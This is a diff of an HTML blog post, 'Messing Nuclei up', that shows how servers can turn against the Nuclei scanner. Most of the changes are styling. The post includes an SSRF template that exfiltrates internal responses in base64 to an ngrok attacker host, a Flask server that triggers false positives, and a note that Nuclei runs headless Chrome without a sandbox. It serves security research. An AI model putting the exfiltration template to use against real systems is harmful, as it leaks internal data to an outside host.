@@ -11,23 +11,26 @@
 			max-width: 50em;
 			margin: 0 auto;
 			color: white;
+			background-color: rgb(0,0,0,0.7);
 			line-height: calc(1ex / 0.32);
 			margin-top: 3em;
+			overflow-wrap: break-word;
 		}
 		pre {
 			font-family: 'gohu', monospace;
 			white-space: pre-wrap;
+			overflow-wrap: anywhere;
 			line-height: 125%;
       		background-color: #111;
     	  	padding: 1em;
-		}
-		.bg_black {
-			background-color: rgb(0,0,0,0.7);
 		}
 		@media only screen and (max-width:768px) {
 			body {
 				max-width:100%;
 			}
+		}
+		td {
+			vertical-align: top;
 		}
 		a:link {
 			color: #0a0 ;
@@ -83,7 +86,7 @@
   <meta charset="UTF-8">
 </head>
 
-<body><div class="bg_black"><h1>Messing Nuclei up</h1>
+<body><h1>Messing Nuclei up</h1>
 <p>1632834092</p>
 <p>Tired of kiddies messing with your servers? Tired of zillions of requests and tool-generated reports? FEAR NO MORE !</p>
 <p>Ok , I'm kinda lazy to write lots of techinical things and be funny, so this post gonna be a dump. The tool is great btw, but is fun to mess with great things I guess.</p>
@@ -107,26 +110,26 @@
 </code></pre></div>
 
 <h2>SSRF</h2>
-<div class="codehilite"><pre><span></span><code><span class="n">id</span><span class="o">:</span><span class="w"> </span><span class="n">ssrf</span><span class="o">-</span><span class="n">poc</span>
+<div class="codehilite"><pre><span></span><code><span class="nx">id</span><span class="p">:</span><span class="w"> </span><span class="nx">ssrf</span><span class="o">-</span><span class="nx">poc</span>
 
-<span class="n">info</span><span class="o">:</span>
-<span class="w">  </span><span class="n">name</span><span class="o">:</span><span class="w"> </span><span class="n">SSRF</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">Nuclei</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">Exfiltration</span>
-<span class="w">  </span><span class="n">author</span><span class="o">:</span><span class="w"> </span><span class="n">caioluders</span>
-<span class="w">  </span><span class="n">severity</span><span class="o">:</span><span class="w"> </span><span class="n">critical</span>
-<span class="w">  </span><span class="n">description</span><span class="o">:</span><span class="w"> </span><span class="n">Makes</span><span class="w"> </span><span class="kd">internal</span><span class="w"> </span><span class="n">request</span><span class="o">,</span><span class="w"> </span><span class="n">dumps</span><span class="w"> </span><span class="n">response</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">attacker</span><span class="err">&#39;</span><span class="n">s</span><span class="w"> </span><span class="n">server</span>
+<span class="nx">info</span><span class="p">:</span>
+<span class="w">  </span><span class="nx">name</span><span class="p">:</span><span class="w"> </span><span class="nx">SSRF</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">Nuclei</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">Exfiltration</span>
+<span class="w">  </span><span class="nx">author</span><span class="p">:</span><span class="w"> </span><span class="nx">caioluders</span>
+<span class="w">  </span><span class="nx">severity</span><span class="p">:</span><span class="w"> </span><span class="nx">critical</span>
+<span class="w">  </span><span class="nx">description</span><span class="p">:</span><span class="w"> </span><span class="nx">Makes</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="nx">request</span><span class="p">,</span><span class="w"> </span><span class="nx">dumps</span><span class="w"> </span><span class="nx">response</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">attacker</span><span class="err">&#39;</span><span class="nx">s</span><span class="w"> </span><span class="nx">server</span>
 
-<span class="n">requests</span><span class="o">:</span>
-<span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="n">method</span><span class="o">:</span><span class="w"> </span><span class="n">GET</span>
-<span class="w">    </span><span class="n">path</span><span class="o">:</span>
-<span class="w">      </span><span class="o">-</span><span class="w"> </span><span class="s2">&quot;http://127.0.0.1:1337/flag&quot;</span>
-<span class="w">      </span><span class="o">-</span><span class="w"> </span><span class="s2">&quot;http://133713371337.ngrok.io/{{base64(output)}}&quot;</span>
-<span class="w">    </span><span class="n">extractors</span><span class="o">:</span>
-<span class="w">      </span><span class="o">-</span><span class="w"> </span><span class="n">type</span><span class="o">:</span><span class="w"> </span><span class="n">regex</span>
-<span class="w">        </span><span class="n">name</span><span class="o">:</span><span class="w"> </span><span class="n">output</span>
-<span class="w">        </span><span class="n">part</span><span class="o">:</span><span class="w"> </span><span class="n">body</span>
-<span class="w">        </span><span class="kd">internal</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span>
-<span class="w">        </span><span class="n">regex</span><span class="o">:</span>
-<span class="w">          </span><span class="o">-</span><span class="w"> </span><span class="s2">&quot;.*&quot;</span>
+<span class="nx">requests</span><span class="p">:</span>
+<span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="nx">method</span><span class="p">:</span><span class="w"> </span><span class="nx">GET</span>
+<span class="w">    </span><span class="nx">path</span><span class="p">:</span>
+<span class="w">      </span><span class="o">-</span><span class="w"> </span><span class="s">&quot;http://127.0.0.1:1337/flag&quot;</span>
+<span class="w">      </span><span class="o">-</span><span class="w"> </span><span class="s">&quot;http://133713371337.ngrok.io/{{base64(output)}}&quot;</span>
+<span class="w">    </span><span class="nx">extractors</span><span class="p">:</span>
+<span class="w">      </span><span class="o">-</span><span class="w"> </span><span class="k">type</span><span class="p">:</span><span class="w"> </span><span class="nx">regex</span>
+<span class="w">        </span><span class="nx">name</span><span class="p">:</span><span class="w"> </span><span class="nx">output</span>
+<span class="w">        </span><span class="nx">part</span><span class="p">:</span><span class="w"> </span><span class="nx">body</span>
+<span class="w">        </span><span class="nx">internal</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span>
+<span class="w">        </span><span class="nx">regex</span><span class="p">:</span>
+<span class="w">          </span><span class="o">-</span><span class="w"> </span><span class="s">&quot;.*&quot;</span>
 </code></pre></div>
 
 <p>Is this a SERVER SIDE, or Client Side? Hacker Side? The question remains...</p>
@@ -652,17 +655,17 @@
 <p>(bit of overkill, I know)</p>
 <p>Example of a false positive server : </p>
 <div class="codehilite"><pre><span></span><code><span class="c1"># coding: utf-8</span>
-<span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span><span class="w"> </span><span class="n">Flask</span><span class="p">,</span><span class="w"> </span><span class="n">render_template</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span>
 
-<span class="n">app</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">,</span><span class="w"> </span><span class="n">template_folder</span><span class="o">=</span><span class="s1">&#39;.&#39;</span><span class="p">)</span>
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">,</span> <span class="n">template_folder</span><span class="o">=</span><span class="s1">&#39;.&#39;</span><span class="p">)</span>
 
-<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">defaults</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;path&#39;</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">})</span>
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="n">defaults</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;path&#39;</span><span class="p">:</span> <span class="s1">&#39;&#39;</span><span class="p">})</span>
 <span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/&lt;path:path&gt;&#39;</span><span class="p">)</span>
 <span class="k">def</span><span class="w"> </span><span class="nf">catch_all</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
-<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">BAD_NUCLEI_STRING_FROM_ABOVE</span>
+    <span class="k">return</span> <span class="n">BAD_NUCLEI_STRING_FROM_ABOVE</span>
 
-<span class="k">if</span><span class="w"> </span><span class="vm">__name__</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
-<span class="w">    </span><span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
 </code></pre></div>
 
 <ol>
@@ -736,23 +739,23 @@
 <p>You can also do a Reverse Nuclei Proxy that identifies the incoming Nuclei request and outputs the expected template matcher. I started coding this, but the demonic string above is cooler and easier. </p>
 <h1>Headless Chrome</h1>
 <p>As seen above, the Headless Chrome of Nuclei runs WITHOUT the Sandbox.</p>
-<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nv">previouspids</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nf">findChromeProcesses</span><span class="p">()</span>
-<span class="w">    </span><span class="nv">chromeLauncher</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nv">launcher</span><span class="o">.</span><span class="nf">New</span><span class="p">()</span><span class="o">.</span>
-<span class="w">        </span><span class="nf">Leakless</span><span class="p">(</span><span class="no">false</span><span class="p">)</span><span class="o">.</span>
-<span class="w">        </span><span class="nf">Set</span><span class="p">(</span><span class="s">&quot;disable-gpu&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;true&quot;</span><span class="p">)</span><span class="o">.</span>
-<span class="w">        </span><span class="nf">Set</span><span class="p">(</span><span class="s">&quot;ignore-certificate-errors&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;true&quot;</span><span class="p">)</span><span class="o">.</span>
-<span class="w">        </span><span class="nf">Set</span><span class="p">(</span><span class="s">&quot;ignore-certificate-errors&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;1&quot;</span><span class="p">)</span><span class="o">.</span>
-<span class="w">        </span><span class="nf">Set</span><span class="p">(</span><span class="s">&quot;disable-crash-reporter&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;true&quot;</span><span class="p">)</span><span class="o">.</span>
-<span class="w">        </span><span class="nf">Set</span><span class="p">(</span><span class="s">&quot;disable-notifications&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;true&quot;</span><span class="p">)</span><span class="o">.</span>
-<span class="w">        </span><span class="nf">Set</span><span class="p">(</span><span class="s">&quot;hide-scrollbars&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;true&quot;</span><span class="p">)</span><span class="o">.</span>
-<span class="w">        </span><span class="nf">Set</span><span class="p">(</span><span class="s">&quot;window-size&quot;</span><span class="p">,</span><span class="w"> </span><span class="nv">fmt</span><span class="o">.</span><span class="nf">Sprintf</span><span class="p">(</span><span class="s">&quot;%d,%d&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">1080</span><span class="p">,</span><span class="w"> </span><span class="mi">1920</span><span class="p">))</span><span class="o">.</span>
-<span class="w">        </span><span class="nf">Set</span><span class="p">(</span><span class="s">&quot;no-sandbox&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;true&quot;</span><span class="p">)</span><span class="o">.</span>
-<span class="w">        </span><span class="nf">Set</span><span class="p">(</span><span class="s">&quot;mute-audio&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;true&quot;</span><span class="p">)</span><span class="o">.</span>
-<span class="w">        </span><span class="nf">Set</span><span class="p">(</span><span class="s">&quot;incognito&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;true&quot;</span><span class="p">)</span><span class="o">.</span>
-<span class="w">        </span><span class="nf">Delete</span><span class="p">(</span><span class="s">&quot;use-mock-keychain&quot;</span><span class="p">)</span><span class="o">.</span>
-<span class="w">        </span><span class="nf">UserDataDir</span><span class="p">(</span><span class="nv">dataStore</span><span class="p">)</span>
+<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="n">previouspids</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="n">findChromeProcesses</span><span class="p">()</span>
+<span class="w">    </span><span class="n">chromeLauncher</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="n">launcher</span><span class="o">.</span><span class="n">New</span><span class="p">()</span><span class="o">.</span>
+<span class="w">        </span><span class="n">Leakless</span><span class="p">(</span><span class="n">false</span><span class="p">)</span><span class="o">.</span>
+<span class="w">        </span><span class="n">Set</span><span class="p">(</span><span class="s">&quot;disable-gpu&quot;</span><span class="o">,</span><span class="w"> </span><span class="s">&quot;true&quot;</span><span class="p">)</span><span class="o">.</span>
+<span class="w">        </span><span class="n">Set</span><span class="p">(</span><span class="s">&quot;ignore-certificate-errors&quot;</span><span class="o">,</span><span class="w"> </span><span class="s">&quot;true&quot;</span><span class="p">)</span><span class="o">.</span>
+<span class="w">        </span><span class="n">Set</span><span class="p">(</span><span class="s">&quot;ignore-certificate-errors&quot;</span><span class="o">,</span><span class="w"> </span><span class="s">&quot;1&quot;</span><span class="p">)</span><span class="o">.</span>
+<span class="w">        </span><span class="n">Set</span><span class="p">(</span><span class="s">&quot;disable-crash-reporter&quot;</span><span class="o">,</span><span class="w"> </span><span class="s">&quot;true&quot;</span><span class="p">)</span><span class="o">.</span>
+<span class="w">        </span><span class="n">Set</span><span class="p">(</span><span class="s">&quot;disable-notifications&quot;</span><span class="o">,</span><span class="w"> </span><span class="s">&quot;true&quot;</span><span class="p">)</span><span class="o">.</span>
+<span class="w">        </span><span class="n">Set</span><span class="p">(</span><span class="s">&quot;hide-scrollbars&quot;</span><span class="o">,</span><span class="w"> </span><span class="s">&quot;true&quot;</span><span class="p">)</span><span class="o">.</span>
+<span class="w">        </span><span class="n">Set</span><span class="p">(</span><span class="s">&quot;window-size&quot;</span><span class="o">,</span><span class="w"> </span><span class="n">fmt</span><span class="o">.</span><span class="n">Sprintf</span><span class="p">(</span><span class="s">&quot;%d,%d&quot;</span><span class="o">,</span><span class="w"> </span><span class="mi">1080</span><span class="o">,</span><span class="w"> </span><span class="mi">1920</span><span class="p">))</span><span class="o">.</span>
+<span class="w">        </span><span class="n">Set</span><span class="p">(</span><span class="s">&quot;no-sandbox&quot;</span><span class="o">,</span><span class="w"> </span><span class="s">&quot;true&quot;</span><span class="p">)</span><span class="o">.</span>
+<span class="w">        </span><span class="n">Set</span><span class="p">(</span><span class="s">&quot;mute-audio&quot;</span><span class="o">,</span><span class="w"> </span><span class="s">&quot;true&quot;</span><span class="p">)</span><span class="o">.</span>
+<span class="w">        </span><span class="n">Set</span><span class="p">(</span><span class="s">&quot;incognito&quot;</span><span class="o">,</span><span class="w"> </span><span class="s">&quot;true&quot;</span><span class="p">)</span><span class="o">.</span>
+<span class="w">        </span><span class="n">Delete</span><span class="p">(</span><span class="s">&quot;use-mock-keychain&quot;</span><span class="p">)</span><span class="o">.</span>
+<span class="w">        </span><span class="n">UserDataDir</span><span class="p">(</span><span class="n">dataStore</span><span class="p">)</span>
 </code></pre></div>
 
 <p><a href="https://github.com/projectdiscovery/nuclei/blob/f5fb8aa305121ceb28981436008acb180b99f0fc/v2/pkg/protocols/headless/engine/engine.go#L46">https://github.com/projectdiscovery/nuclei/blob/f5fb8aa305121ceb28981436008acb180b99f0fc/v2/pkg/protocols/headless/engine/engine.go#L46</a></p>
 <p>So every 1day on chrome will become a RCE on Nuclei. Dont ever run <code>-headless</code> I guess.</p>
-<p>( ´ ▽ ` )/</p></body><hr>by <a href='https://twitter.com/caioluders'>@caioluders</a></div></html>
+<p>( ´ ▽ ` )/</p></body><hr>by <a href='https://twitter.com/caioluders'>@caioluders</a></html>
